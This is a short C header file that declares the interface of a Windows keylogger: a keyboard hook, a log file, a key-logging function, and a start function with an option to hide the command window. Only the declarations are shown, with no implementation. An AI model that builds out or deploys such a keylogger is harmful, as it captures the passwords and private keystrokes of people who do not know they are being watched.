#pragma once

#include <stdio.h>
#include <stdint.h>
#include <windows.h>
#include <time.h>

static HHOOK keyboard_hook;
static FILE *key_log;

static int8_t log_key(const DWORD *KEY);

static LRESULT __stdcall keyboard_hook_callback(int n_code, WPARAM wparam, LPARAM lparam);

__attribute__((unused)) int8_t cokol_start_key_logging(const char *KEY_LOG_FILE_NAME, uint8_t SHOW_CMD_WINDOW);
